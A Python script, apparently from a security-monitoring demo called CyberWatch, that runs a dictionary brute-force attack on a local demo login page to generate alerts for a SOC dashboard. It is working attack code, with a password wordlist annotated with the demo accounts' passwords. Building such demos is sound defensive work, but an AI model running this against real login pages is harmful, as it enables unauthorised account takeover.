#!/usr/bin/env python3
"""
CyberWatch Demo — Brute Force Attacker
=======================================
Simulates a real-world credential stuffing / brute-force attack
against the AcmeCorp login page.

This script demonstrates:
  1. Attacker tries common passwords one-by-one
  2. Each failure triggers a Wazuh alert in CyberWatch
  3. After ~5 failures, CyberWatch correlates them into a HIGH incident
  4. When the password is found, CyberWatch raises a CRITICAL incident
  5. SOC analyst sees the full attack timeline in real-time

Usage:
  python brute_force.py                              # default: attack admin
  python brute_force.py --user admin --target http://localhost:5001
  python brute_force.py --user ceo --delay 1.0
"""
import argparse
import os
import sys
import time
import requests
from datetime import datetime

# ANSI colors
RED    = "\033[91m"
GREEN  = "\033[92m"
YELLOW = "\033[93m"
CYAN   = "\033[96m"
WHITE  = "\033[97m"
DIM    = "\033[2m"
BOLD   = "\033[1m"
RESET  = "\033[0m"

# Common password wordlist — attacker's dictionary
PASSWORD_WORDLIST = [
    "123456", "password", "12345678", "qwerty", "abc123",
    "111111", "admin", "letmein", "welcome", "monkey",
    "dragon", "master", "123123", "sunshine", "princess",
    "football", "shadow", "superman", "michael", "jessica",
    "password123",   # <-- this is the actual admin password (will be found)
    "Password1", "login123", "acmecorp", "company123",
    "Acme@2024",     # <-- ceo's password
    "HRportal#9",    # <-- hr.manager's password
    "Summer2024!", "Winter2023", "Spring2024",
]


def print_header(target_url: str, username: str):
    print(f"""
{RED}{BOLD}╔══════════════════════════════════════════════════════════════╗
║          CyberWatch Demo — Brute Force Attack Simulator      ║
║                  ⚠️  FOR DEMONSTRATION ONLY ⚠️               ║
╚══════════════════════════════════════════════════════════════╝{RESET}

{CYAN}Target  : {WHITE}{target_url}{RESET}
{CYAN}Username: {WHITE}{username}{RESET}
{CYAN}Wordlist: {WHITE}{len(PASSWORD_WORDLIST)} passwords{RESET}
{CYAN}Started : {WHITE}{datetime.now().strftime('%H:%M:%S')}{RESET}

{YELLOW}Watch the CyberWatch dashboard at http://localhost:5173{RESET}
{DIM}Alerts will appear in real-time as each attempt is made...{RESET}

{"─" * 65}
""")


def try_login(session: requests.Session, target_url: str, username: str, password: str) -> bool:
    """Attempt a login. Returns True if successful."""
    try:
        resp = session.post(
            f"{target_url}/login",
            data={"username": username, "password": password},
            allow_redirects=False,
            timeout=5,
        )
        # Redirect to /dashboard means success
        return resp.status_code in (301, 302) and "dashboard" in resp.headers.get("Location", "")
    except requests.RequestException as e:
        print(f"{RED}  Connection error: {e}{RESET}")
        return False


def run_attack(target_url: str, username: str, delay: float, stop_on_success: bool):
    sess = requests.Session()
    sess.headers.update({"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"})

    print_header(target_url, username)

    # Check target is reachable
    try:
        r = sess.get(f"{target_url}/login", timeout=5)
        print(f"{GREEN}✓ Target reachable (HTTP {r.status_code}){RESET}\n")
    except Exception as e:
        print(f"{RED}✗ Cannot reach target: {e}{RESET}")
        print(f"{YELLOW}  Make sure the demo target is running: python demo_target/app.py{RESET}")
        sys.exit(1)

    found_password = None
    total = len(PASSWORD_WORDLIST)

    for i, password in enumerate(PASSWORD_WORDLIST, 1):
        # Visual progress
        bar_filled = int((i / total) * 30)
        bar = "█" * bar_filled + "░" * (30 - bar_filled)
        
        print(f"{DIM}[{i:>3}/{total}] [{bar}] {RESET}"
              f"Trying: {CYAN}{password:<20}{RESET}", end=" ", flush=True)

        success = try_login(sess, target_url, username, password)

        if success:
            found_password = password
            print(f"{GREEN}{BOLD}✓ SUCCESS!{RESET}")
            break
        else:
            status_color = RED if i >= 5 else YELLOW
            print(f"{status_color}✗ FAIL{RESET}")

        time.sleep(delay)

    print(f"\n{'─' * 65}")

    if found_password:
        print(f"""
{RED}{BOLD}╔══════════════════════════════════════════════════════════════╗
║                 🚨 BREACH SUCCESSFUL 🚨                      ║
╚══════════════════════════════════════════════════════════════╝{RESET}

{WHITE}Username : {GREEN}{username}{RESET}
{WHITE}Password : {GREEN}{found_password}{RESET}
{WHITE}Found in : {GREEN}{i} attempts{RESET}
{WHITE}Cracked  : {GREEN}{datetime.now().strftime('%H:%M:%S')}{RESET}

{YELLOW}The attacker now has access to:{RESET}
  • Customer PII database (84,391 records)
  • Financial reports ($48.2M revenue data)
  • Employee payroll information
  • Internal system credentials

{CYAN}{BOLD}➜  Check CyberWatch dashboard: http://localhost:5173{RESET}
{CYAN}   A CRITICAL incident should now be visible!{RESET}
{CYAN}   The SOC analyst can approve "Revoke User Session" action.{RESET}
""")
    else:
        print(f"""
{YELLOW}Attack complete — password not found in wordlist ({total} attempts).{RESET}
{DIM}The attacker would continue with a larger wordlist in reality.{RESET}
Check CyberWatch: http://localhost:5173 — a HIGH incident should be visible.
""")
    
    return found_password


def main():
    parser = argparse.ArgumentParser(
        description="CyberWatch Demo — Brute Force Attack Simulator",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python brute_force.py                            # Attack 'admin' account
  python brute_force.py --user ceo --delay 0.3    # Attack 'ceo', faster
  python brute_force.py --target http://localhost:5001 --user hr.manager
        """
    )
    parser.add_argument("--target", default=os.environ.get("TARGET_URL", "http://localhost:5001"),
                        help="Target login page URL (default: http://localhost:5001)")
    parser.add_argument("--user", default="admin",
                        help="Username to attack (default: admin)")
    parser.add_argument("--delay", type=float, default=0.4,
                        help="Delay between attempts in seconds (default: 0.4)")
    args = parser.parse_args()

    run_attack(args.target, args.user, args.delay, stop_on_success=True)


if __name__ == "__main__":
    main()
